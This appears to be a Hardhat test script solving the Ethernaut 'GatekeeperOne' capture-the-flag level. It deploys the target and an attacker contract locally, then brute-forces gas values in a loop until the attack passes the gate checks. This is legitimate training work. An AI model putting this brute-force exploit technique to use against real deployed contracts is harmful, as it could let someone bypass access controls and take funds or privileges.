// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");


async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    const signers = await hre.ethers.getSigners();
    GatekeeperOne = await hre.ethers.getContractFactory("GatekeeperOne");
    target = await GatekeeperOne.deploy();
    await target.deployed();


    GatekeeperOneAtt = await hre.ethers.getContractFactory("GatekeeperOneAtt");
    const att = await GatekeeperOneAtt.deploy();
    await att.deployed();

    for (var i = 0; i < 8191; i++) {
        try {
            const attackTx = await att.attack(target.address, i, { gasLimit: 1245000 });
            await attackTx.wait();
        } catch (error) {
            // console.log("fail with", i);
            continue
        }

        console.log("succeed with", i);
        break;
    }


    expect(await target.entrant()).to.equal(signers[0].address);


}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
